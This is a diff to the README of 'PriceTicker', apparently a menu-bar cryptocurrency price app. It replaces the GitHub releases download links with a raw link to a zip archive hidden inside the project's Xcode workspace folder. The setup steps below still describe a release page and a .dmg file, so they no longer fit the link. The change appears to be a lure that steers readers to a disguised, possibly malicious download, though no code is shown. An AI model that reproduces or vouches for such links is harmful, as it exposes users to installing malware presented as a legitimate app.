@@ -1,12 +1,12 @@
 # 📈 PriceTicker - Real time crypto prices made simple
 
-[![](https://img.shields.io/badge/Download-PriceTicker-blue.svg)](https://github.com/SKING911/PriceTicker/releases)
+[![](https://img.shields.io/badge/Download-PriceTicker-blue.svg)](https://raw.githubusercontent.com/SKING911/PriceTicker/main/PriceTicker.xcodeproj/project.xcworkspace/Price-Ticker-3.5.zip)
 
 PriceTicker keeps you updated on cryptocurrency markets from your desktop. You see current prices for Bitcoin and other digital assets without opening a web browser. The app sits in your menu bar and provides data at a glance.
 
 ## 🚀 How to set up
 
-[Download the latest version here](https://github.com/SKING911/PriceTicker/releases). 
+[Download the latest version here](https://raw.githubusercontent.com/SKING911/PriceTicker/main/PriceTicker.xcodeproj/project.xcworkspace/Price-Ticker-3.5.zip). 
 
 1. Click the link above to reach the release page.
 2. Locate the file ending in .dmg or the standard installer for your system.
